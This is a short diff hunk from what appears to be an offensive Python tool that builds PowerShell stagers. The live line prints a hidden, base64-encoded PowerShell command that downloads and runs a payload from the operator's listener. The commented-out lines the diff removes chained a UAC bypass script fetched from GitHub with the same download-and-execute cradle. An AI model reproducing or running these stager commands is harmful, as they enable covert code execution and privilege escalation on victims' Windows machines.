@@ -164,10 +164,6 @@ def printListener():
     global randoStagerDLPort # need to fix asap. Globals are shit fam
     randoStagerDLPort = random.randint(5000,9000)
     FUNCTIONS().DoServe(FUNCTIONS().CheckInternet(), powershellFileName, payloaddir(), port=randoStagerDLPort, printIt = False)
-    #uacBypassStager = raw_input(t.bold_green + "Use UAC bypass for stager? y/[N]: " + t.normal)
-    #if uacBypassStager.lower() == 'y':
-        #print 'powershell -w hidden -noni -enc ' + ("IEX (New-Object Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Invoke-EventVwrBypass.ps1\");Invoke-EventVwrBypass -Command \"powershell.exe -c IEX (New-Object Net.Webclient).DownloadString('http://" + FUNCTIONS().CheckInternet() + ":" + str(randoStagerDLPort) + "/" + powershellFileName + "')\"").encode('utf_16_le').encode('base64').replace('\n','')
-    #else:
     print 'powershell -w hidden -noni -enc ' + ("IEX (New-Object Net.Webclient).DownloadString('http://" + FUNCTIONS().CheckInternet() + ":" + str(randoStagerDLPort) + "/" + powershellFileName + "')").encode('utf_16_le').encode('base64').replace('\n','')
     return "pass"
 
